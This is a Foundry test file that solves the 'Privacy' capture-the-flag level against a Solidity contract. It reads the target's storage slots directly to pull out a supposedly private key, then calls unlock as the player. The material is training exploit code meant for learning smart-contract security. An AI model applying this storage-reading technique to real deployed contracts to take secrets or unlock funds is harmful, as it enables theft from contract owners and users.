// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {PrivacyFactory} from "src/levels/PrivacyFactory.sol";

interface IPrivacy {
    function unlock(bytes16 _key) external;
}

contract PrivacyTest is Test {
    PrivacyFactory level;
    IPrivacy target;
    address player;

    function setUp() public {
        // ----------------------------------
        // Create level instance
        // ----------------------------------
        vm.warp(1641070800);

        level = new PrivacyFactory();
        player = makeAddr("PLAYER");
        target = IPrivacy(level.createInstance(player));
    }

    function test_Privacy() public {
        // ----------------------------------
        // Initiate attack
        // ----------------------------------

        /* 
        slot[0] = bool locked
        slot[1] = uint256 ID
        slot[2]
            - byte[0:1] = uint8 flattening
            - byte[1:2] = uint8 denomination
            - byte[2:4] = uint16 awkwardness
        slot[3] = data[0];
        slot[4] = data[1];
        slot[5] = data[2];
        */
        for (uint256 i; i < 6; ++i) {
            console.logBytes32(vm.load(address(target), bytes32(uint256(i))));
        }
        bytes16 key = bytes16(vm.load(address(target), bytes32(uint256(5))));

        vm.prank(player);
        target.unlock(key);

        // ----------------------------------
        // Validate
        // ----------------------------------
        bool success = level.validateInstance(payable(address(target)), player);
        assertEq(success, true);
    }
}
